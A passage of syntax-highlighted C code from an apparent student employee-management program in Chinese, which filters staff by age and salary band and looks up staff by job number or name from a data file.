punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">30</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">30</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工薪资范围\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.低薪    \t\t     2.中薪\t\t\t  3.高薪\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">3000</span><span class="token operator">&amp;&amp;</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">8000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3_1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token comment">//以员工号方式查询某个员工的信息。</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的职工号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token comment">//以员工号方式查询某个员工的信息。</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的职工号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3_2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//以姓名方式查找员工；</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的姓名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token 